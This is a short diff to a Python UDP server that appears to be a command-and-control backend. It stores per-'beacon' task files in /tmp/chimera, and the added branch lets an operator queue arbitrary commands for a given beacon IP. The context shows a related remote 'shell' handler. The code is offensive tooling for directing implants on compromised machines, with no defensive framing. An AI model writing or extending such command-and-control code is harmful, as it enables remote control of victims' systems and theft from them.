@@ -79,6 +79,24 @@ def run():
                     f.write(cont)
                     f.close()
                     sock.sendto("confirm".encode(), addr)
+            elif (dataSplit[0] == "command") and (len(dataSplit[1]) > 0) and (len(dataSplit[2].split('.')) == 4):
+                if not os.path.exists("/tmp/chimera/" + dataSplit[2]):
+                    sock.sendto("not_found".encode(), addr)
+                else:
+                    command = dataSplit[1]
+                    beacon = dataSplit[2]
+                    
+                    f = open("/tmp/chimera/" + beacon, "r")
+                    cont = f.read()
+                    f.close()
+                    contSplit = cont.split('\n')
+                    contSplit.append("command")
+                    contSplit.append(command)
+                    cont = '\n'.join(contSplit)
+                    f = open("/tmp/chimera/" + beacon, "w")
+                    f.write(cont)
+                    f.close()
+                    sock.sendto("confirm".encode(), addr)
         elif (len(dataSplit) == 4):
             if (dataSplit[0] == "shell") and (len(dataSplit[1].split('.')) == 4) and ((int(dataSplit[2]) > 0) and (int(dataSplit[2]) <= 510)) and (len(dataSplit[3].split('.')) == 4):
                 if not os.path.exists("/tmp/chimera/" + dataSplit[3]):
